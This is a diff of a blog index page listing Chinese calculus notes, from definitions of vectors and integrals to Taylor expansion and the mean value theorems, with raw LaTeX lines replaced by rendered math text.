class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-20T15:58:53.000Z" title="发表于 2023-03-20 23:58:53">2023-03-20</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-19T09:38:40.993Z" title="更新于 2023-04-19 17:38:40">2023-04-19</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
+共有概念
+概念：空间或者平面具有大小和方向的量
+表示：AB→\overrightarrow{AB}AB或者a⃗\vec{a}a
+膜长：平面或者空间中向量的大小。记作∣AB→∣|\overrightarrow{AB}|∣AB∣或者∣a⃗∣|\vec{a}|∣a∣
+特殊向量
+单位向量
+对于任意向量a⃗\vec{a}a，不论方向如何，若其大小为单位长度，则称其为a⃗\vec{a}a方向上的单位向量（Unit vector）。单位向量通常被记为u⃗\vec{u}u，它们的模长为1。
+空间坐标系的三个基向量i⃗=(1,0,0){\displaystyle {\vec {i}}=(1,0,0)}i=(1,0,0)，j⃗=(0,1,0){\displaystyle {\vec {j}}=(0,1,0)}j​=(0,1,0)，k⃗=(0,0,1){\displaystyle {\vec {k}}=(0,0,1)}k=(0,0,1)都是单位向量。
+反向量
+一个向量v⃗\vec{v}v的反向量（Opposite vector）与它大小相等，但方向相反，一般记作−v⃗{\displaystyle -{\v ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/03/10/FurtherMathematics_0x08/" title="定积分"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/161.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="定积分"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/03/10/FurtherMathematics_0x08/" title="定积分">定积分</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-10T15:58:53.000Z" title="发表于 2023-03-10 23:58:53">2023-03-10</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-13T05:12:22.748Z" title="更新于 2023-03-13 13:12:22">2023-03-13</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
+定积分
+定义
+设函数f(x)f(x)f(x)在[a,b][a,b][a,b]上有界，在[a,b][a,b][a,b]中任意插入若干个分点：
+\begin{align}a=x_0 &lt; x_1 &lt; \cdots &lt; x_{i-1} &lt; x_i &lt; \cdots &lt; x_{n-1} &lt; x_n=b\end{align}
+把[a,b][a,b][a,b]分成nnn个小区间：
+\begin{align}[x_0,x_1],\ \cdots,[x_{i-1},x_{i}],\ \cdots,\ [x_{n-1},x_n]\end{align}
 各个小区间的长度依次为：
-$\begin{align}\Delta x1=x_1-x_0,\ \cdots,\ \Delta x_i=x{i}-x{i-1},\cdots,\ \Delta x_n=x_n-x{n-1}\end{align}$
-在每个小区间$[x{i-1},x_i]$上任取一点$\xi_i(x{i-1}\le\xi_i\le x_i)$，作函数值$f(\xi_i)$与小区间长度$\Delta x_i$的乘积$f(\xi_i)\Delta x_i(i=1,2,\cdots ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2023/03/05/FurtherMathematics_0x07/" title="不定积分"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/160.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="不定积分"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/03/05/FurtherMathematics_0x07/" title="不定积分">不定积分</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-05T15:58:53.000Z" title="发表于 2023-03-05 23:58:53">2023-03-05</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-13T06:21:39.538Z" title="更新于 2023-03-13 14:21:39">2023-03-13</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
-原函数与不定积分定理就是一句话：连续函数一定有原函数
-$\begin{align}\int f(x)\mathrm{~d}x\end{align}$
-符号$\int$成为积分号，$f(x)$称为被积函数，$f(x)\mathrm{~d}x$称为被积表达式，$x$称为积分变量
+\begin{align}\Delta x_1=x_1-x_0,\ \cdots,\ \Delta x_i=x_{i}-x_{i-1},\cdots,\ \Delta x_n=x_n-x_{n-1}\end{align}
+在每个小区间[xi−1,xi][x_{i-1},x_i][xi−1​,xi​]上任取一点ξi(xi−1≤ξi≤xi)\xi_i(x_{i-1}\le\xi_i\le x_ ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2023/03/05/FurtherMathematics_0x07/" title="不定积分"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/160.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="不定积分"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/03/05/FurtherMathematics_0x07/" title="不定积分">不定积分</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-05T15:58:53.000Z" title="发表于 2023-03-05 23:58:53">2023-03-05</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-13T06:21:39.538Z" title="更新于 2023-03-13 14:21:39">2023-03-13</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
+原函数与不定积分
+定理就是一句话：连续函数一定有原函数
+\begin{align}
+\int f(x)\mathrm{~d}x
+\end{align}
+符号∫\int∫成为积分号，f(x)f(x)f(x)称为被积函数，f(x) dxf(x)\mathrm{~d}xf(x) dx称为被积表达式，xxx称为积分变量
 基本积分表
 
 
@@ -338,111 +391,91 @@ $\begin{align}\int f(x)\mathrm{~d}x\end{align}$
 
 
 
-$\int k \mathrm{~d} x=k x+C \quad$
+∫k dx=kx+C\int k \mathrm{~d} x=k x+C \quad∫k dx=kx+C
 
 
-$\int x^{\mu} \mathrm{~d} x=\frac{x^{\mu+1}}{\mu+1}+C \quad(\mu \neq-1)$
+∫xμ dx=xμ+1μ+1+C(μ≠−1)\int x^{\mu} \mathrm{~d} x=\frac{x^{\mu+1}}{\mu+1}+C \quad(\mu \neq-1)∫xμ dx=μ+1xμ+1​+C(μ​=−1)
 
 
-$\int \frac{\mathrm{~d} x}{x}=\ln \mid x\mid+C$
+∫ dxx=ln⁡∣x∣+C\int \frac{\mathrm{~d} x}{x}=\ln \mid x\mid+C∫x dx​=ln∣x∣+C
 
 
-$\int \frac{\mathrm{~d} x}{1+x^{2}}=\arctan x+C$
+∫ dx1+x2=arctan⁡x+C\int \frac{\mathrm{~d} x}{1+x^{2}}=\arctan x+C∫1+x2 dx ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/02/27/FurtherMathematics_0x06/" title="函数的单调性、曲线的凹凸性、极值与最大最小值"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/159.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="函数的单调性、曲线的凹凸性、极值与最大最小值"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/02/27/FurtherMathematics_0x06/" title="函数的单调性、曲线的凹凸性、极值与最大最小值">函数的单调性、曲线的凹凸性、极值与最大最小值</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-27T15:58:53.000Z" title="发表于 2023-02-27 23:58:53">2023-02-27</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-08T09:38:33.823Z" title="更新于 2023-03-08 17:38:33">2023-03-08</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
+函数的单调性
+定理：设函数f(x)f(x)f(x)在[a,b]\left [a,b \right ][a,b]上连续，(a,b)\left (a,b\right)(a,b)内可导
 
-
-$\int \frac{\mathrm{~d} x}{\sqrt{1-x^{2}}}=\arcsin x+C$
-
-
-$\int \cos x \mathrm{~d} x=\sin x+C$
-
-
-$\int \sin x \mathrm{~d} x=-\cos  ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/02/27/FurtherMathematics_0x06/" title="函数的单调性、曲线的凹凸性、极值与最大最小值"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/159.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="函数的单调性、曲线的凹凸性、极值与最大最小值"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/02/27/FurtherMathematics_0x06/" title="函数的单调性、曲线的凹凸性、极值与最大最小值">函数的单调性、曲线的凹凸性、极值与最大最小值</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-27T15:58:53.000Z" title="发表于 2023-02-27 23:58:53">2023-02-27</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-08T09:38:33.823Z" title="更新于 2023-03-08 17:38:33">2023-03-08</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
-函数的单调性定理：设函数$f(x)$在$\left [a,b \right ]$上连续，$\left (a,b\right)$内可导
-
-若在$\left (a,b\right)$内${f}’(x)\ge0$且等于0仅在有限点处成立，那么$f(x)$在$\left [a,b \right ]$上严格单调增加
-若在$\left (a,b\right)$内${f}’(x)\le 0$且等于0仅在有限点处成立，那么$f(x)$在$\left [a,b \right ]$上严格单调减少
+若在(a,b)\left (a,b\right)(a,b)内f′(x)≥0{f}&#x27;(x)\ge0f′(x)≥0且等于0仅在有限点处成立，那么f(x)f(x)f(x)在[a,b]\left [a,b \right ][a,b]上严格单调增加
+若在(a,b)\left (a,b\right)(a,b)内f′(x)≤0{f}&#x27;(x)\le 0f′(x)≤0且等于0仅在有限点处成立，那么f(x)f(x)f(x)在[a,b]\left [a,b \right ][a,b]上严格单调减少
 
 判断函数单调性的步骤
 
 确定定义域
-求一阶导数，找到驻点（${f}’(x)= 0$的点）和不可导的点
-以这两类点划分定义区间，判断${f}’(x)$在各子区间内的符号，从而确定函数在各子区间的单调性。一般会列表分析
+求一阶导数，找到驻点（f′(x)=0{f}&#x27;(x)= 0f′(x)=0的点）和不可导的点
+以这两类点划分定义区间，判断f′(x){f}&#x27;(x)f′(x)在各子区间内的符号，从而确定函数在各子区间的单调性。一般会列表分析
 
 
-例题：讨论函数$f(x)=\frac{1}{3}x^3+x^2+x+2$的单调性
-解：$f(x)$的定义域为$(-\infty ,+\infty )$，且$f(x)$处处连续，处处可导
-$\begin{align} {f}’(x)=x^2+2x+1=(x+1)^2\ge0\end{align} ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2023/02/26/FurtherMathematics_0x05/" title="泰勒展开"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/158.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="泰勒展开"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/02/26/FurtherMathematics_0x05/" title="泰勒展开">泰勒展开</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-26T15:58:53.000Z" title="发表于 2023-02-26 23:58:53">2023-02-26</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-08T09:32:18.469Z" title="更新于 2023-03-08 17:32:18">2023-03-08</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
-什么是泰勒公式基本定义泰勒公式一句话描述：就是用多项式函数去逼近光滑函数。
-设$n$是一个正整数。如果定义在一个包含$a$的区间上的函数$f$在$a$点处$n+1$次可导，那么对于这个区间上的任意$x$都有:
-$\begin{align} f(x)= &amp; \sum{n=0}^{\infty} \frac{f^{(n)}(a)}{n !} (x-a)^{n} \&amp;=f(a)+\frac{f^{\prime}(a)}{1 !}(x-a)+\frac{f^{(2)}(a)}{2 !}(x-a)^{2}+\cdots+\frac{f^{(n)}(a)}{n !}(x-a)^{n}+R{n}(x)\end{align}$
-$f^{(n)}(a)$表示$f(x)$在第$n$阶导数的表达式，带入一个值$a$计算后得到的结果（注意，它是个值）
-$\frac{1}{n!}$是一个系数（一个值），每一项都不同，第一项 $\frac{1}{1!}$，第二项$\frac{1}{2!}$依此类推
-$(x-a)^n$是一个以$x$为自变量的表达式
-$R_n(x)$是泰勒公式的余项，是$(x-a) ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/02/16/FurtherMathematics_0x04/" title="洛必达法则"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/157.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="洛必达法则"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/02/16/FurtherMathematics_0x04/" title="洛必达法则">洛必达法则</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-16T15:58:53.000Z" title="发表于 2023-02-16 23:58:53">2023-02-16</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-25T09:40:43.376Z" title="更新于 2023-02-25 17:40:43">2023-02-25</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
-洛必达法则对于分式$\frac{f(x)}{g(x)}$，如果在自变量的某一变化过程中，分子分母的极限均为零或者均为无穷大，这时该分式的极限可能存在，也可能不存在，通常称这种分式的极限为未定式，分别记为$\frac{0}{0}$和$\frac{\infty}{\infty}$
-洛必达法则：在自变量$x$的某一个变化过程中$x \to a , x \to a^+ , x \to a^- , x \to \infty , x \to -\infty , x \to + \infty$，设$f(x),g(x)$ 满足下列条件：
+例题：讨论函数f(x)=13x3 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2023/02/26/FurtherMathematics_0x05/" title="泰勒展开"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/158.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="泰勒展开"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/02/26/FurtherMathematics_0x05/" title="泰勒展开">泰勒展开</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-26T15:58:53.000Z" title="发表于 2023-02-26 23:58:53">2023-02-26</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-08T09:32:18.469Z" title="更新于 2023-03-08 17:32:18">2023-03-08</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
+什么是泰勒公式
+基本定义
+泰勒公式一句话描述：就是用多项式函数去逼近光滑函数。
+设nnn是一个正整数。如果定义在一个包含aaa的区间上的函数fff在aaa点处n+1n+1n+1次可导，那么对于这个区间上的任意xxx都有:
+\begin{align} f(x)= &amp; \sum_{n=0}^{\infty} \frac{f^{(n)}(a)}{n !} (x-a)^{n} \\&amp;=f(a)+\frac{f^{\prime}(a)}{1 !}(x-a)+\frac{f^{(2)}(a)}{2 !}(x-a)^{2}+\cdots+\frac{f^{(n)}(a)}{n !}(x-a)^{n}+R_{n}(x)\end{align}
+f(n)(a)f^{(n)}(a)f(n)(a)表示f(x)f(x)f(x)在第nnn阶导数的表达式，带入一个值aaa计算后得到的结果（注意，它是个值）
+1n!\frac{1}{n!}n!1​是一个系数（一个值），每一项都不同，第一项 11!\frac{1}{1!}1!1​，第二项12!\frac{1}{2!}2!1​依此类推
+(x−a)n(x- ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/02/16/FurtherMathematics_0x04/" title="洛必达法则"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/157.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="洛必达法则"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/02/16/FurtherMathematics_0x04/" title="洛必达法则">洛必达法则</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-16T15:58:53.000Z" title="发表于 2023-02-16 23:58:53">2023-02-16</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-25T09:40:43.376Z" title="更新于 2023-02-25 17:40:43">2023-02-25</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
+洛必达法则
+对于分式f(x)g(x)\frac{f(x)}{g(x)}g(x)f(x)​，如果在自变量的某一变化过程中，分子分母的极限均为零或者均为无穷大，这时该分式的极限可能存在，也可能不存在，通常称这种分式的极限为未定式，分别记为00\frac{0}{0}00​和∞∞\frac{\infty}{\infty}∞∞​
+洛必达法则：在自变量xxx的某一个变化过程中x→a,x→a+,x→a−,x→∞,x→−∞,x→+∞x \to a , x \to a^+ , x \to a^- , x \to \infty , x \to -\infty , x \to + \inftyx→a,x→a+,x→a−,x→∞,x→−∞,x→+∞，设f(x),g(x)f(x),g(x)f(x),g(x) 满足下列条件：
 
-函数$f(x),g(x)$的极限均为0或者$\infty$
-$f(x),g(x)$均可导，既${f}’(x),{g}’(x)$ 存在，且${g}’(x) \ne 0$
-$\lim \frac{f’(x)}{g’(x)}$存在或者为$\infty$
+函数f(x),g(x)f(x),g(x)f(x),g(x)的极限均为0或者∞\infty∞
+f(x),g(x)f(x),g(x)f(x),g(x)均可导，既f′(x),g′(x){f}&#x27;(x),{g}&#x27;(x)f′(x),g′(x) 存在，且g′(x)≠0{g}&#x2 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2023/02/14/FurtherMathematics_0x03/" title="微分中值定理"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/156.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="微分中值定理"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/02/14/FurtherMathematics_0x03/" title="微分中值定理">微分中值定理</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-14T15:58:53.000Z" title="发表于 2023-02-14 23:58:53">2023-02-14</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-14T09:24:11.455Z" title="更新于 2023-02-14 17:24:11">2023-02-14</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
+微积分中的基础概念
+罗尔中值定理
+前导
 
-则$\lim  \frac{f(x)}{g(x)}=\lim \frac{f’(x)}{g’(x)}$
-做题思路：判断类型然后求导到不再是$\frac{0}{0}$ 和$\frac{\infty}{\infty}$ 后 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2023/02/14/FurtherMathematics_0x03/" title="微分中值定理"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/156.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="微分中值定理"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/02/14/FurtherMathematics_0x03/" title="微分中值定理">微分中值定理</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-14T15:58:53.000Z" title="发表于 2023-02-14 23:58:53">2023-02-14</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-14T09:24:11.455Z" title="更新于 2023-02-14 17:24:11">2023-02-14</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
-微积分中的基础概念罗尔中值定理前导
-可以认为他从$A$点出发，经过一段时间又回到了$A$点，画成$s-t$（位移-时间）图就是：
+可以认为他从AAA点出发，经过一段时间又回到了AAA点，画成s−ts-ts−t（位移-时间）图就是：
 
 根据常识，因为要回到起点，中间必定有速度为0的点，这就是罗尔中值定理
-定理设函数满足以下三个条件：
+定理
+设函数满足以下三个条件：
 
-$f(x)$在闭区间$[a,b]$上连续
-$f(x)$在开区间$(a,b)$上可导
-$f(a)=f(b)$
+f(x)f(x)f(x)在闭区间[a,b][a,b][a,b]上连续
+f(x)f(x)f(x)在开区间(a,b)(a,b)(a,b)上可导
+f(a)=f(b)f(a)=f(b)f(a)=f(b)
 
-则存在$\xi \in (a,b)$，使得${f}’(\xi)=0$。
-$f(x)$在闭区间$[a,b]$上连续是必须的，否则可能没有${f}’(\xi)=0$
+则存在ξ∈(a,b)\xi \in (a,b)ξ∈(a,b)，使得f′(ξ)=0{f}&#x27;(\xi)=0f′(ξ)=0。
+f(x)f(x)f(x)在闭区间[a,b][a,b][a,b]上连续是必须的，否则可能没有f′(ξ)=0{f}&#x27;(\xi)=0f′(ξ)=0
 
 
-拉格朗日中值定理前导通过交通管理中的区间测速：位移➗时间＝平均速度。这样的话可以通过计算你走了一段固定距离的时间来计算你是否超速
-时间$a$采集到汽车的位移为$f(a)$，时间$b$采集到汽车的位移为$f(b)$
+拉格朗日中值定理
+前导
+通过交通管理中的区间测速：位移➗时间＝平均速度。这样的话可以通过计算你走了一段固定距离的时间来计算你是否超速
+时间aaa采集到汽车的位移为f(a)f(a)f(a)，时间bbb采集到汽车的位移为f(b)f(b)f(b)
 
-可以据此算出平均速度为：
-$\begin{align}\frac{f(b)-f(a)}{b-a}\end{align}$
-比如算出来平均速度为$70km/h$，平均速度是由瞬时速度叠加的结果，那么路程中的瞬时速度可能为：
-
-匀速前进：那么整个路程的瞬时速度必然全为$70k ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/02/07/FurtherMathematics_0x02/" title="极限、导数、微分"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/155.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="极限、导数、微分"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/02/07/FurtherMathematics_0x02/" title="极限、导数、微分">极限、导数、微分</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-07T15:58:53.000Z" title="发表于 2023-02-07 23:58:53">2023-02-07</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-03T05:55:52.495Z" title="更新于 2023-08-03 13:55:52">2023-08-03</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
-极限微商（即导数）是一种极限。定积分也是一种极限。
+可以据此算出平均速度 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/02/07/FurtherMathematics_0x02/" title="极限、导数、微分"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/155.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="极限、导数、微分"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/02/07/FurtherMathematics_0x02/" title="极限、导数、微分">极限、导数、微分</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-07T15:58:53.000Z" title="发表于 2023-02-07 23:58:53">2023-02-07</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-03T05:55:52.495Z" title="更新于 2023-08-03 13:55:52">2023-08-03</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
+极限
+微商（即导数）是一种极限。定积分也是一种极限。
 
 关于这一节推荐观看下面视频，讲的是非常的好
  
+符号解释
+ε\varepsilonε和δ\deltaδ都表示一个非常小的数，意义是一样的，只是为了让看起来显示不一样
+∀\forall∀取任意一个值
+直观介绍
+《庄子》曰：“一尺之捶，日取其半，万世不竭。”假设有一尺长的线段，每天划去一半，那么它的长度会变得如何呢？如果我们查看特定的某一天，比如说第7天，那么线段的长度还剩1128\frac{1}{128}1281​尺。但我们想知道的是，线段的长度“最终”会怎么样？用数学的语言来说，就是以下的数列：
+\begin{align}
+a_{0} = 1, \quad a_{1} = \frac{1}{2}, \quad a_{2} = \frac{1}{4}, \cdots, a_{n} = \frac{1}{2^{n}}, \cdots
+\end{align}
+在nnn&quot;非常大&quot;的时候会有什么性质？为此我们可以建立以下的表格看看nnn&quot;非常大&quot;的时候，ana_nan​会是什么样子：
 
 
 
-符号解释$\varepsilon$和$\delta$都表示一个非常小的数，意义是一样的，只是为了让看起来显示不一样
-$\forall$取任意一个值
-直观介绍《庄子》曰：“一尺之捶，日取其半，万世不竭。”假设有一尺长的线段，每天划去一半，那么它的长度会变得如何呢？如果我们查看特定的某一天，比如说第7天，那么线段的长度还剩$\frac{1}{128}$尺。但我们想知道的是，线段的长度“最终”会怎么样？用数学的语言来说，就是以下的数列：
-$\begin{align}a{0} = 1, \quad a{1} = \frac{1}{2}, \quad a{2} = \frac{1}{4}, \cdots, a{n} = \frac{1}{2^{n}}, \cdots\end{align}$
-在$n$”非常大”的时候会有什么性质？为此我们可以建立以下的表格看看$n$”非常大”的时候，$a_n$会是什么样子：
-
-
-
-
-$n$
-1
-5
-20
-100
-500
-10000
-
-
-
-
-$a_n$
-0. ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/12/07/FurtherMathematics_0x01/" title="函数与映射"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/154.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="函数与映射"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/12/07/FurtherMathematics_0x01/" title="函数与映射">函数与映射</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-12-07T15:58:53.000Z" title="发表于 2022-12-07 23:58:53">2022-12-07</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-13T06:23:39.110Z" title="更新于 2023-03-13 14:23:39">2023-03-13</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
-映射定义：$X$、$Y$ 非空集合, 法则 $f$ , 对 $X$ 中每个元素 $x$  。唯一的$y$  与之对应, $f: X \rightarrow Y$
-三要素：$X$ 原像、$f$ 映射、$R_{f}$ 值域
-$x \in X$对应的$y$是唯一的 , $R{f} \subset Y R{f} \neq Y$
-
+nnn
